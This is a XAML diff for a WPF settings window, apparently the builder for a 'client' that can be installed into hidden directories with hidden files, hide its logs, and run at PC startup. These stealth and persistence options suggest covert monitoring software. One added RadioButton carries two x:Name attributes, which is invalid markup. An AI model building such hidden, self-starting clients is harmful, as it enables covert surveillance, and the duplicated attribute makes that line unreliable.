@@ -100,7 +100,7 @@
                             </StackPanel>
 
                             <CheckBox Margin="0 15 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
-                                      x:Name="chkDirHidden">
+                                      x:Name="chkHideLogsDir">
                                 Hide log directory.
                             </CheckBox>
 
@@ -125,7 +125,7 @@
                             <Label FontWeight="Medium" FontSize="25" Content="Installation"></Label>
 
                             <CheckBox Margin="0 15 0 0" x:Name="chkInstall" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
-                                       Click="chkInstallEvent" IsEnabled="False">
+                                       Click="chkInstallEvent">
                                 Add client to system path.
                             </CheckBox>
 
@@ -133,9 +133,9 @@
                                 <TextBlock x:Name="lblDirectory" Foreground="LightGray" Margin="0 15 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
                                            Text="Directory :" />
                                 <StackPanel Margin="15 0 0 0">
-                                    <RadioButton Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 15 0 0" GroupName="Os" Content="User / AppData" IsChecked="True"/>
-                                    <RadioButton Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="Program Files"/>
-                                    <RadioButton Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="System"/>
+                                    <RadioButton x:Name="radio1" Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 15 0 0" GroupName="Os" x:Name="rdbAppData" Content="User / AppData" IsChecked="True"/>
+                                    <RadioButton x:Name="radio2"  Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="Program Files"/>
+                                    <RadioButton x:Name="radio3"  Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="System"/>
                                 </StackPanel>
                             </StackPanel>
                             
@@ -143,9 +143,9 @@
                                 <TextBlock x:Name="lblSubDirectory" Foreground="LightGray" Margin="0 15 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
                                            Text="Subdirectory :" />
                                 <StackPanel Orientation="Horizontal">
-                                    <TextBox Style="{x:Null}" HorizontalAlignment="Left"  Width="200"/>
+                                    <TextBox Style="{x:Null}" HorizontalAlignment="Left" x:Name="txtSubDirI" Width="200"/>
                                     <CheckBox Margin ="15 0 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
-                                          >
+                                          x:Name="chkHideSubDirI">
                                         set to hidden.
                                     </CheckBox>
                                 </StackPanel>
@@ -154,10 +154,10 @@
                             <StackPanel x:Name="spFileName" IsEnabled="False" Orientation="Vertical">
                                 <TextBlock x:Name="lblFileName" Foreground="LightGray" Margin="0 5 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
                                            Text="Name :" />
-                                <StackPanel Orientation="Horizontal">                                    
-                                    <TextBox Style="{x:Null}" HorizontalAlignment="Left"  Width="200"/>
+                                <StackPanel Orientation="Horizontal">
+                                    <TextBox Style="{x:Null}" HorizontalAlignment="Left" x:Name="txtFileNameI"  Width="200"/>
                                     <CheckBox Margin ="15 0 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
-                                          >
+                                          x:Name="chkHideFileI">
                                         set to hidden.
                                     </CheckBox>
                                 </StackPanel>
@@ -169,8 +169,10 @@
                                           Foreground="black" FontSize="11" Click="chkAutoStartEvent">
                                     Run client on PC startup.
                                 </CheckBox>
-                                <StackPanel Margin="0 0 0 0" VerticalAlignment="Top" Orientation="Horizontal">
-                                    <TextBox x:Name="txtStartupName" Style="{x:Null}" Text="" Width="200" IsEnabled="False" />
+                                <StackPanel>
+                                    <TextBlock x:Name="lblStartupName" Foreground="LightGray" Margin="0 5 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
+                                           Text="Name :" />
+                                    <TextBox x:Name="txtStartupName" HorizontalAlignment="Left" Style="{x:Null}" Text="" Width="200" IsEnabled="False" />
                                 </StackPanel>
                             </StackPanel>
                         </StackPanel>
